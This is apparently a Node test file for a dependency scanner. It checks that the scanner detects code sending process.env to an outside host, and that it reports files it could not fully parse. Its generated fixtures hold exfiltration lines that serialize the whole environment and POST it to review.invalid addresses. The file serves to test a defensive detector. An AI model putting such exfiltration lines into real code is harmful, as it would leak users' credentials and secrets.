// BIG-BUNDLE-TAIL (0.1.9), the external review of Oct 20: (2) a method's call reaches each function of its name (a
// second object's `send` hid `a.send(data)`); (3) a file the supply-chain tree did not read whole (the parser refused
// valid code, 500 nested brackets; the model's budget ran out) is SC-TRUNCATED in the tree's words, beside what the
// text follower found, never a quiet OK; (4) callbacks of one function, each its own `data`, are read in linear time
// and charged to the call's budget. Twin of python/tests/registry/test_big_bundle_tail_review.py and of the engine's
// flow_tail_review_tests.rs. Inert text only: nothing is executed; the addresses are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { call, importTimeRisk, NativeExhausted, exhaustedWhy, TREE_CUT } from "../src/lib/native.js";
import { depFileIssues } from "../src/deps.js";

const WHOLE = ["environment", "the whole environment", false];
const NESTING = "const nesting=" + "[".repeat(500) + "0" + "]".repeat(500) + ";\n";
const memberSend = (n) => "const a = {send: function send(data) {\n  fetch('https://review.invalid/collect', {method:'POST', body:data});\n}};\n"
  + Array.from({ length: n - 1 }, (_, k) => `const b${k} = {send: function send(data) { return data; }};\n`).join("")
  + "function main() {\n  const data = JSON.stringify(process.env);\n  a.send(data);\n}\nmain();\n";
const memberReturn = (n) => "class S { grab() { const data = JSON.stringify(process.env); return data; } }\n"
  + Array.from({ length: n - 1 }, (_, k) => `class T${k} { grab() { const data = 'x'; return data; } }\n`).join("")
  + "function main(s) { const data = s.grab(); fetch('https://review.invalid/collect', {method:'POST', body:data}); }\nmain(new S());\n";
const callbacks = (n) => "function invoke(cb){\n" + "cb(process.env);\n".repeat(1000) + "}\n"
  + "invoke(data=>fetch('https://review.invalid/x',{method:'POST',body:JSON.stringify(data)}));\n".repeat(n);
const STRESS = "function stress(flag){\n" + Array.from({ length: 10000 }, (_, k) => `let a${k}=0;\n`).join("")
  + Array.from({ length: 10000 }, (_, k) => `if(flag){a${k}=1;}\n`).join("") + "return a0;}\nstress(false);\n";
const sent = (text, args = {}) => {
  const got = call("local_data_sent_at", args, text);
  return got === null ? null : got.slice(1);
};

test("a method's call reaches each function of its name", () => {
  for (const n of [1, 2, 3]) {
    assert.deepEqual(sent(memberSend(n)), WHOLE, `send, ${n}`);
    const [found, , cut] = depFileIssues("node_modules/x/index.js", NESTING + memberSend(n), "js");
    assert.deepEqual([found.rule, found.sev, cut.rule, cut.sev], ["SC-IMPORT-RISK", "CRITICAL", "SC-TRUNCATED", "CRITICAL"], `${n}`);
  }
  for (const n of [1, 2]) assert.deepEqual(sent(memberReturn(n)), WHOLE, `return, ${n}`);
});

test("a file the tree did not read whole is SC-TRUNCATED, in the tree's words", () => {
  // refused: valid code past the parser's bound; the import-time test asked with `unread` says it beside what it found
  const [reasons, , refused, unread] = call("import_time_risk", { lang: "js", refused: true, unread: true }, NESTING + memberSend(2));
  assert.equal(reasons.length, 1);
  assert.deepEqual(refused, [1, "nesting too deep"]);
  assert.ok(unread.startsWith(TREE_CUT + "the parser refused it at line 1 (nesting too deep)"), unread);
  // asked without it, the call answers as one that ran out, in the tree's words
  assert.throws(() => importTimeRisk(NESTING + memberSend(2), "js"), (e) => e instanceof NativeExhausted && exhaustedWhy(e).startsWith(TREE_CUT));
  // past the model's budget (a function of 10,000 declarations), the follower quiet: SC-TRUNCATED all the same
  const [, , cut] = depFileIssues("node_modules/x/index.js", STRESS + "const payload=JSON.stringify(process.env);\n", "js");
  assert.equal(call("local_data_sent_tree", { lang: "js" }, STRESS), "unread");
  assert.ok(cut && cut.rule === "SC-TRUNCATED" && cut.msg.includes(TREE_CUT + "the JavaScript cross-file pass stopped"), JSON.stringify(cut));
  // code the parser refuses that no runtime runs (a syntax error): no truncation
  assert.equal(depFileIssues("node_modules/x/index.js", memberSend(2) + "\nfunction refused( {\n", "js")[2], null);
});

test("callbacks are read in linear time, within the call's budget", () => {
  for (const n of [3000, 8000]) {
    const start = process.cpuUsage();
    assert.deepEqual(sent(callbacks(n)), WHOLE, `${n}`);
    const used = process.cpuUsage(start);
    assert.ok((used.user + used.system) / 1e6 < 10, `${n}: ${(used.user + used.system) / 1e6} s`);
    assert.throws(() => sent(callbacks(n), { budget: 1_000_000 }), (e) => e instanceof NativeExhausted, `${n}`);
  }
});
